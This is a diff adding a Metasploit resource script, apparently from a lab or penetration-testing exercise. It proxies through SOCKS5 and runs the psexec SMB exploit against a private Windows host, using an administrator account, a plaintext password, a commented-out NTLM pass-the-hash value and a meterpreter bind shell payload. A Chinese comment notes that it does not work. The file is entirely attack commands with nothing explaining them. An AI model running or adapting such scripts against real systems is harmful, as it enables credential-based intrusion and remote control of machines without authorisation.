@@ -1,0 +1,11 @@
+# 不好使
+setg Proxies socks5:127.0.0.1:1080
+use exploit/windows/smb/psexec
+set rhosts 192.168.93.10
+set SMBDomain TEST
+set SMBUser administrator
+set SMBPass zxcASDqw123!!
+# set SMBPass fc5d63d71569f04399b419bc76e2eb34:18edd0cc3227be3bf61ce198835a1d97
+set payload windows/meterpreter/bind_tcp
+set rhost 192.168.93.10
+run
